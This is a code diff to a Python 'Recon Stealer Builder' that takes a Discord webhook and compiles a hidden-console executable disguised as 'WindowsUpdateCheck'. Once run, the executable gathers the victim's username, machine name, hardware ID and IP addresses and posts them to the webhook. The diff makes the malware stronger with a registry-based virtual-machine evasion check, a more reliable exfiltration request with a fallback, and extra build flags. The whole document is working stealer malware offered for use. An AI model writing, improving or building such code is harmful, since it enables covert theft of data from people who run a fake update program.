@@ -13,6 +13,7 @@ import textwrap
 import requests
 import uuid
 import platform
+import winreg  # For extra VM detection
 
 # =================== WEBHOOK TEST ===================
 def test_webhook(hook):
@@ -31,11 +32,9 @@ def get_webhook():
     root.title("Recon Stealer Builder - Silent Edition")
     root.geometry("600x280")
     root.resizable(False, False)
-
     tk.Label(root, text="Discord Webhook URL:", font=("Arial", 11)).pack(pady=15)
     webhook_entry = tk.Entry(root, width=80)
     webhook_entry.pack(pady=5)
-
     def run_test():
         hook = webhook_entry.get().strip()
         success, msg = test_webhook(hook)
@@ -43,21 +42,16 @@ def get_webhook():
             messagebox.showinfo("OK", msg)
         else:
             messagebox.showerror("Failed", msg)
-
     tk.Button(root, text="TEST WEBHOOK", command=run_test, bg="#5865F2", fg="white", font=("Arial", 10, "bold")).pack(pady=10)
-
     progress = ttk.Progressbar(root, mode="indeterminate")
-
     def build():
         webhook = webhook_entry.get().strip()
         if not webhook or "discord.com/api/webhooks" not in webhook:
             messagebox.showerror("Nope", "Valid webhook required.")
             return
-
         progress.pack(pady=15)
         progress.start()
         root.update()
-
         try:
             generate_malware(webhook)
             progress.stop()
@@ -68,7 +62,6 @@ def get_webhook():
             progress.pack_forget()
             messagebox.showerror("Error", str(e))
         root.destroy()
-
     tk.Button(root, text="BUILD EXE", command=build, bg="green", fg="white", font=("Arial", 14, "bold"), height=2).pack(pady=20)
     root.mainloop()
 
@@ -83,10 +76,12 @@ import requests
 import ctypes
 import platform
 import uuid
+import winreg
 from datetime import datetime
 
 def is_vm():
     try:
+        # Existing checks
         if "VIRTUAL" in subprocess.check_output("systeminfo", shell=True, text=True).upper():
             return "Yes (SystemInfo)"
         if os.path.exists(r"C:\\windows\\System32\\drivers\\VBoxMouse.sys"):
@@ -99,6 +94,12 @@ def is_vm():
         ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
         if mem.ullTotalPhys < 4 * 1024**3:
             return "Yes (Low RAM)"
+        
+        # Extra registry check for VMs
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum")
+        val = winreg.QueryValueEx(key, "0")[0].lower()
+        if "vmware" in val or "vbox" in val or "virtual" in val:
+            return "Yes (Registry)"
     except:
         pass
     return "No"
@@ -130,27 +131,31 @@ def exfil():
     data = f"""
 RECON REPORT - {datetime.utcnow().isoformat()} UTC
 ================================================
-Username       : {os.getenv("USERNAME")}
-Computer Name  : {platform.node()}
-OS             : {platform.system()} {platform.release()} ({platform.version()})
-CPU            : {platform.processor()}
-HWID           : {get_hwid()}
-VM Detected    : {is_vm()}
-Public IP      : {get_public_ip()}
-Local IP       : {get_local_ip()}
+Username : {os.getenv("USERNAME")}
+Computer Name : {platform.node()}
+OS : {platform.system()} {platform.release()} ({platform.version()})
+CPU : {platform.processor()}
+HWID : {get_hwid()}
+VM Detected : {is_vm()}
+Public IP : {get_public_ip()}
+Local IP : {get_local_ip()}
 """
     temp_file = os.path.join(os.getenv("TEMP"), "update_check.txt")
     try:
         with open(temp_file, "w", encoding="utf-8") as f:
             f.write(data)
         
+        # Proper multipart for file + payload
         with open(temp_file, "rb") as f:
             files = {"file": ("recon.txt", f)}
             payload = {"content": f"**New recon hit** - {os.getenv('USERNAME')}@{platform.node()}"}
-            requests.post("{WEBHOOK_PLACEHOLDER}", data=payload, files=files, timeout=20)
-    except:
+            resp = requests.post("{WEBHOOK_PLACEHOLDER}", data=payload, files=files, timeout=20)
+            if resp.status_code != 204:
+                raise Exception(f"Send failed: {resp.text}")
+    except Exception as e:
         try:
-            requests.post("{WEBHOOK_PLACEHOLDER}", json={"content": "Fallback:\\n```\\n" + data + "\\n```"})
+            # Fallback to text only
+            requests.post("{WEBHOOK_PLACEHOLDER}", json={"content": f"Fallback:\\n```\\n{data}\\nError: {str(e)}\\n```"})
         except:
             pass
     finally:
@@ -161,9 +166,9 @@ Local IP       : {get_local_ip()}
 
 exfil()
 
-# Stay resident quietly
-while True:
-    time.sleep(3600)
+# Stay resident quietly (comment out if not needed)
+# while True:
+#     time.sleep(3600)
 ''')
 
 # =================== BUILD ===================
@@ -175,10 +180,12 @@ def generate_malware(webhook):
         f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", webhook))
     
     cmd = [
-        "pyinstaller",
+        "pyinstaller" if "pyinstaller" in subprocess.getoutput("pyinstaller --version") else "python -m PyInstaller",
         "--onefile",
         "--noconsole",
         "--name", "WindowsUpdateCheck",
+        "--clean",  # Nuke old build junk
+        "--hidden-import=winreg",  # For extra VM check
         script
     ]
     
@@ -191,9 +198,6 @@ def generate_malware(webhook):
     shutil.copyfile(exe, final)
     shutil.rmtree(temp_dir, ignore_errors=True)
     print(f"Built silent recon stealer: {final}")
-
-if __name__ == "__main__":
-    get_webhook()
 
 if __name__ == "__main__":
     get_webhook()
